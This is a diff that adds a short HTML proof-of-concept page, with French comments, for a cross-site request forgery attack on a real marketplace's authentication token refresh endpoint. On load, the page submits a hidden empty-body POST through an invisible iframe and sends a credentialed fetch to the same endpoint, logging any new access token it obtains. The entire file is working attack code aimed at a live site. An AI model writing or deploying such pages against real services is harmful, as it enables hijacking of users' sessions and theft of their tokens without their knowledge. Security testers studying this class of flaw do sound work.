@@ -1,0 +1,54 @@
+<!-- csrf_refresh.html -->
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>CSRF Token Refresh</h2>
+    
+    <iframe name="hidden" style="display:none"></iframe>
+    
+    <form id="refreshForm" action="https://www.vinted.fr/web/api/auth/refresh" 
+          method="POST" target="hidden">
+        <!-- AUCUN CORPS nécessaire ! C'est ça qui est dangereux -->
+    </form>
+    
+    <script>
+        console.log('Test CSRF sur /refresh...');
+        
+        // Méthode 1 : Formulaire vide
+        setTimeout(() => {
+            document.getElementById('refreshForm').submit();
+            console.log('Requête POST /refresh envoyée (formulaire)');
+        }, 1000);
+        
+        // Méthode 2 : Fetch pour voir la réponse
+        setTimeout(() => {
+            fetch('https://www.vinted.fr/web/api/auth/refresh', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                credentials: 'include', // Envoie les cookies
+                // PAS DE BODY !
+            })
+            .then(r => {
+                console.log('Status:', r.status);
+                console.log('Headers:', [...r.headers.entries()]);
+                return r.text();
+            })
+            .then(text => {
+                console.log('Réponse:', text);
+                try {
+                    const data = JSON.parse(text);
+                    if (data.access_token) {
+                        console.log('✅ NOUVEAU TOKEN OBTENU VIA CSRF !');
+                        console.log('Token:', data.access_token.substring(0, 30) + '...');
+                    }
+                } catch(e) {
+                    console.log('Réponse non-JSON');
+                }
+            })
+            .catch(e => console.error('Erreur:', e));
+        }, 2000);
+    </script>
+</body>
+</html>
